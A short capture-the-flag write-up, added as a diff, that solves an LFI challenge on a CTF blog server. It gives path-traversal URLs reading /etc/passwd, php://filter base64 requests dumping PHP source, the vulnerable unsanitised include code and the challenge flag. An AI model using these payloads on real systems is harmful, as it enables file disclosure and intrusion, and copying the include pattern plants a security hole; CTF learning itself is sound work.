@@ -1,0 +1,38 @@
+The hint mentions something about robots, so started there
+
+flag.php
+How do you filter your coffee?
+
+searching for filter and lfi... this works, theres def a lfi here
+http://ez.ctf.cafe:9999/blog-posts.php?file=?page=../../../../../../../../etc/passwd
+
+http://ez.ctf.cafe:9999/blog-posts.php?file=php://filter/convert.base64-encode/resource=blog-posts.php
+PD9waHAgaW5jbHVkZSAiYmxvZ0NvbmZpZy5waHAiOw0KDQo/Pg0K
+<?php include "blogConfig.php";
+
+?>
+
+http://ez.ctf.cafe:9999/blog-posts.php?file=php://filter/convert.base64-encode/resource=blogConfig.php
+<?php include "blogConfig.php";
+
+?>
+<?php
+    if ($_SERVER["REQUEST_METHOD"] == "GET") {
+        // collect value of input field
+        $file = $_GET['file'];
+        if (!empty($file)) {
+            include $file;
+        } else {
+            include 'blog-posts.html';
+        }
+    }
+?>
+
+http://ez.ctf.cafe:9999/blog-posts.php?file=php://filter/convert.base64-encode/resource=index.php
+Nothing interesting
+
+http://ez.ctf.cafe:9999/blog-posts.php?file=php://filter/convert.base64-encode/resource=flag.php
+<?php
+	echo 'How do you filter your coffee?';    
+	// EZ-CTF{LFI_1S_3Z}
+?>
